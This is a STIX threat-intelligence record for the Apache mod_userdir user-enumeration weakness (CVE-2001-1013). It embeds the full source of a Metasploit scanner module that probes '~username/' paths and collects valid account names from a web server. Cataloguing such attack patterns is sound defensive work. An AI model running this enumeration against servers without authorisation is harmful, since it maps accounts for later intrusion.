{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9559a1b1-ffae-443d-8854-c68ea3efbad0",
    "created": "2024-08-14T16:30:23.777235Z",
    "modified": "2024-08-14T16:30:23.777239Z",
    "name": "Apache \"mod_userdir\" User Enumeration",
    "description": "Apache with the UserDir directive enabled generates different error codes when a username exists and there is no public_html directory and when the username does not exist, which could allow remote attackers to determine valid usernames on the server.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_userdir_enum.rb",
            "external_id": "apache_userdir_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-1013"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'           => 'Apache \"mod_userdir\" User Enumeration',\n      'Description'    => %q{Apache with the UserDir directive enabled generates different error\n      codes when a username exists and there is no public_html directory and when the username\n      does not exist, which could allow remote attackers to determine valid usernames on the\n      server.},\n      'Author'         =>\n        [\n          'Heyder Andrade <heyder.andrade[at]alligatorteam.org>',\n        ],\n      'References'     =>\n        [\n          ['BID', '3335'],\n          ['CVE', '2001-1013'],\n          ['OSVDB', '637'],\n        ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to users Home Page', '/']),\n        OptPath.new('USER_FILE',  [ true, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"unix_users.txt\") ]),\n      ])\n\n    deregister_options(\n      'PASSWORD',\n      'PASS_FILE',\n      'USERPASS_FILE',\n      'STOP_ON_SUCCESS',\n      'BLANK_PASSWORDS',\n      'USER_AS_PASS'\n    )\n  end\n\n  def run_host(ip)\n    @users_found = {}\n\n    each_user_pass { |user,pass|\n      do_login(user)\n    }\n\n    if(@users_found.empty?)\n      print_status(\"#{full_uri} - No users found.\")\n    else\n      print_good(\"#{full_uri} - Users found: #{@users_found.keys.sort.join(\", \")}\")\n      report_note(\n        :host => rhost,\n        :port => rport,\n        :proto => 'tcp',\n        :sname => (ssl ? 'https' : 'http'),\n        :type => 'users',\n        :data => {:users =>  @users_found.keys.join(\", \")}\n      )\n    end\n  end\n\n  def do_login(user)\n\n    vprint_status(\"#{full_uri}~#{user} - Trying UserDir: '#{user}'\")\n    uri = normalize_uri(target_uri.path)\n    payload = \"#{uri}~#{user}/\"\n    begin\n      res = send_request_cgi!(\n        {\n          'method'  => 'GET',\n          'uri'     => payload,\n          'ctype'   => 'text/plain'\n        }, 20)\n\n      return unless res\n      if ((res.code == 403) or (res.code == 200))\n        print_good(\"#{full_uri} - Apache UserDir: '#{user}' found \")\n        @users_found[user] = :reported\n      else\n        vprint_status(\"#{full_uri} - Apache UserDir: '#{user}' not found \")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}